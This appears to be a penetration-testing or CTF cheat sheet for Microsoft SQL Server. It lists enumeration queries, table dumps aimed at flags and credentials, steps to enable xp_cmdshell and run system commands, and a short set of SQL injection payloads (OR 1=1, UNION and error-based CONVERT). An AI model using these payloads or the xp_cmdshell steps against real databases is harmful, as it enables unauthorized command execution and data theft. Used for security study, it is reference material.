
---

### 🔍 **1. Information Gathering / Enumeration**

#### 🔸 List all databases

```sql
SELECT name FROM master..sysdatabases;
-- OR
SELECT name FROM sys.databases;
```

#### 🔸 Switch to a database

```sql
USE dbname;
```

#### 🔸 List all tables in the current database

```sql
SELECT name FROM sys.tables;
-- OR
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

#### 🔸 List all columns in a table

```sql
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name';
```

#### 🔸 List all users

```sql
SELECT name FROM master..syslogins;
```

#### 🔸 Get current user

```sql
SELECT SYSTEM_USER;
-- OR
SELECT USER_NAME();
```

---

### 📥 **2. Data Extraction (Flags, Credentials, etc.)**

#### 🔸 Dump all rows from a table

```sql
SELECT * FROM table_name;
```

#### 🔸 Basic filter/search

```sql
SELECT * FROM users WHERE username = 'admin';
```

---

### ⚙️ **3. Command Execution (if `xp_cmdshell` is enabled)**

#### 🔸 Enable `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

#### 🔸 Run a system command

```sql
EXEC xp_cmdshell 'whoami';
```

---

### 🔐 **4. Login / Auth Checks**

#### 🔸 Brute-force user discovery

```sql
SELECT name FROM master..syslogins WHERE name LIKE '%admin%';
```

#### 🔸 Check current DB

```sql
SELECT DB_NAME();
```

---

### 🧬 **5. Misc / Useful Metadata**

#### 🔸 Show SQL Server version

```sql
SELECT @@VERSION;
```

#### 🔸 Current hostname / server name

```sql
SELECT HOST_NAME();
SELECT @@SERVERNAME;
```

#### 🔸 List procedures (look for `xp_`, `sp_`)

```sql
SELECT name FROM sys.procedures;
```

---

### 💣 **6. SQL Injection Payload Tips**

If doing SQLi against MS SQL:

```sql
' OR 1=1--
' UNION SELECT null, @@version--
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))
```
